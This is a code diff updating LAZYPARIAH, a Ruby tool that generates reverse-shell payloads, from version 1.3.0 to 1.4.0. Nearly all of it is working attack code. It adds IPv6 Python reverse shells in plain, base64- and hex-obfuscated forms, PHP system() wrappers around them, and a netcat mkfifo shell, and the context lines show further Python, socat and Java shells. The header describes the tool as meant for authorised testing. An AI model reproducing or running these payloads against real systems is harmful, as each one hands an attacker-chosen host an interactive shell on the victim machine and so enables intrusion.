@@ -1,7 +1,7 @@
 #!/usr/bin/env ruby
 #
 # Title: LAZYPARIAH
-# Version: 1.3.0
+# Version: 1.4.0
 # Description:
 #	LAZYPARIAH is a simple tool for generating various reverse shell payloads
 #	on the fly. It is intended to be used only in authorised circumstances by
@@ -29,7 +29,7 @@ require "stringio"
 
 # Define constants.
 PROGRAM_NAME = "LAZYPARIAH".freeze()
-PROGRAM_VERSION = "1.3.0".freeze()
+PROGRAM_VERSION = "1.4.0".freeze()
 EXECUTABLE_NAME = "lazypariah".freeze()
 
 # Define payload list.
@@ -38,6 +38,10 @@ PAYLOAD_LIST = [
 	"python_c",
 	"python_b64",
 	"python_hex",
+	"python_ipv6",
+	"python_ipv6_c",
+	"python_ipv6_b64",
+	"python_ipv6_hex",
 	"nc",
 	"nc_pipe",
 	"php_fd",
@@ -45,6 +49,8 @@ PAYLOAD_LIST = [
 	"php_fd_tags",
 	"php_system_python_b64",
 	"php_system_python_hex",
+	"php_system_python_ipv6_b64",
+	"php_system_python_ipv6_hex",
 	"perl",
 	"perl_c",
 	"perl_b64",
@@ -59,6 +65,7 @@ PAYLOAD_LIST = [
 	"java_class",
 	"c_binary",
 	"rust_binary",
+	"nc_openbsd"
 ].sort()
 
 # Define dictionary of payload aliases for backwards compatibility with versions < 1.0.0.
@@ -242,24 +249,46 @@ begin
 			when "python"
 				# Python reverse shell.
 				print_output(s: "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"#{ARGV[1]}\",#{ARGV[2]}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);", url_encode: url_encode, new_line: !arguments[:"no-new-line"])
+			when "python_ipv6"
+				# Python IPv6 reverse shell.
+				print_output(s: "import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\"#{ARGV[1]}\",#{ARGV[2]},0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);", url_encode: url_encode, new_line: !arguments[:"no-new-line"])
 			when "python_c"
 				# Python reverse shell (intended to be run as a command from a shell session).
 				print_output(s: "python#{python_version} -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"#{ARGV[1]}\",#{ARGV[2]}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'", url_encode: url_encode, new_line: !arguments[:"no-new-line"])
+			when "python_ipv6_c"
+				# Python IPv6 reverse shell (intended to be run as a command from a shell session).
+				print_output(s: "python#{python_version} -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\"#{ARGV[1]}\",#{ARGV[2]},0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'", url_encode: url_encode, new_line: !arguments[:"no-new-line"])
 			when "python_b64"
 				# Base-64-encoded Python reverse shell (intended to be run as a command from a shell session).
 				code = Base64.strict_encode64("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"#{ARGV[1]}\",#{ARGV[2]}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);")
+				print_output(s: "echo #{code} | base64 -d | python#{python_version}", url_encode: url_encode, new_line: !arguments[:"no-new-line"])
+			when "python_ipv6_b64"
+				# Base-64-encoded Python IPv6 reverse shell (intended to be run as a command from a shell session).
+				code = Base64.strict_encode64("import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\"#{ARGV[1]}\",#{ARGV[2]},0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);")
 				print_output(s: "echo #{code} | base64 -d | python#{python_version}", url_encode: url_encode, new_line: !arguments[:"no-new-line"])
 			when "python_hex"
 				# Hex-encoded Python reverse shell (intended to be run as a command from a shell session).
 				code = "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"#{ARGV[1]}\",#{ARGV[2]}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);".unpack("H*")[0]
 				print_output(s: "echo #{code} | xxd -p -r - | python#{python_version}", url_encode: url_encode, new_line: !arguments[:"no-new-line"])
+			when "python_ipv6_hex"
+				# Hex-encoded Python IPv6 reverse shell (intended to be run as a command from a shell session).
+				code = "import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\"#{ARGV[1]}\",#{ARGV[2]},0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);".unpack("H*")[0]
+				print_output(s: "echo #{code} | xxd -p -r - | python#{python_version}", url_encode: url_encode, new_line: !arguments[:"no-new-line"])
 			when "php_system_python_b64"
 				# Hybrid shell: python_b64 payload contained within a system function in a miniature PHP script.
 				python_code = Base64.strict_encode64("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"#{ARGV[1]}\",#{ARGV[2]}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);")
 				print_output(s: "<?php system(\"echo #{python_code} | base64 -d | python#{python_version}\"); ?>", url_encode: url_encode, new_line: !arguments[:"no-new-line"])
+			when "php_system_python_ipv6_b64"
+				# Hybrid shell: python_ipv6_b64 payload contained within a system function in a miniature PHP script.
+				python_code = Base64.strict_encode64("import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\"#{ARGV[1]}\",#{ARGV[2]},0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);")
+				print_output(s: "<?php system(\"echo #{python_code} | base64 -d | python#{python_version}\"); ?>", url_encode: url_encode, new_line: !arguments[:"no-new-line"])
 			when "php_system_python_hex"
 				# Hybrid shell: python_hex payload contained within a system function in a miniature PHP script.
 				python_code = "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"#{ARGV[1]}\",#{ARGV[2]}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);".unpack("H*")[0]
+				print_output(s: "<?php system(\"echo #{python_code} | xxd -p -r - | python#{python_version}\"); ?>", url_encode: url_encode, new_line: !arguments[:"no-new-line"])
+			when "php_system_python_ipv6_hex"
+				# Hybrid shell: python_ipv6_hex payload contained within a system function in a miniature PHP script.
+				python_code = "import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\"#{ARGV[1]}\",#{ARGV[2]},0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);".unpack("H*")[0]
 				print_output(s: "<?php system(\"echo #{python_code} | xxd -p -r - | python#{python_version}\"); ?>", url_encode: url_encode, new_line: !arguments[:"no-new-line"])
 			when "nc"
 				# Netcat reverse shell.
@@ -321,6 +350,9 @@ begin
 			when "socat"
 				# Socat reverse shell.
 				print_output(s: "socat tcp-connect:#{ARGV[1]}:#{ARGV[2]} system:/bin/sh", url_encode: url_encode, new_line: !arguments[:"no-new-line"])
+			when "nc_openbsd"
+				# Netcat (OpenBSD) reverse shell.
+				print_output(s: "rm /tmp/r; mkfifo /tmp/r; cat /tmp/r | /bin/sh -i 2>&1 | nc #{ARGV[1]} #{ARGV[2]} > /tmp/r", url_encode: url_encode, new_line: !arguments[:"no-new-line"])
 			when "java_class"
 				# Java class reverse shells (compiled on the fly).
 				code = "import java.io.IOException;import java.io.InputStream;import java.io.OutputStream;import java.net.Socket;public class rs {public rs() throws Exception {Process p=new ProcessBuilder(\"/bin/sh\").redirectErrorStream(true).start();Socket s=new Socket(\"#{ARGV[1]}\",#{ARGV[2]});InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()) {while(pi.available()>0) {so.write(pi.read());}while(pe.available()>0) {so.write(pe.read());}while(si.available()>0) {po.write(si.read());}so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;} catch (Exception e) {}}p.destroy();s.close();}}"
